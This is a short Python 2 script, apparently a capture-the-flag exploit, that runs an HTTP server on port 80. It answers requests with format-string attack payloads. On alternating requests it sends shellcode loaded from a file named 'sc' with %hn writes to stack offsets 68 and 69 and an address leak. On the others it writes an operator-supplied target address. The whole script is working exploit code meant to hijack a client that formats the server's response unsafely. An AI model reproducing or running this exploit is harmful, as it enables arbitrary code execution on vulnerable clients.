
import time
import BaseHTTPServer

cnt = 0

HOST_NAME = '0.0.0.0'
PORT_NUMBER = 80

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_HEAD(s):
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()

    def do_GET(s):
        global cnt
        s.send_response(200)
        s.send_header("Content-type", "text/plain")
        s.end_headers()
        ret = 'Your time">'
        if cnt % 2 == 0:
            #for i in range(6, 90):
            #    ret += '%d %%%d$llx\n' % (i, i)
            # ret += "%064u%69$hn%03787u%68$hn format addr = %13$llx"
            sc = open('sc').read()
            print 'len(sc) = %d' % len(sc)
            if len(sc) > 0x40:
                raise Exception('sc len = %d < %d' % (len(sc), 0x40))
            ret += sc + '%%0%du%%69$hn%%0%du%%68$hn format addr = %%13$llx' % (64-len(sc), 3787)
        else:
            addr = raw_input('format addr: ')
            addr = int(addr, 16)
            if addr > 0xffffffff:
                raise Exception('addr = ' + str(addr))
            ret += '%%0%du%%69$hn%%0%du%%68$hn' % (addr >> 16, (addr & 0xffff) - (addr >> 16))
        cnt += 1
        ret += "</p>";
        s.wfile.write(ret)
        print len(ret), ret

if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    print time.asctime(), "Server Starts - %s:%s" % (HOST_NAME, PORT_NUMBER)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print time.asctime(), "Server Stops - %s:%s" % (HOST_NAME, PORT_NUMBER)

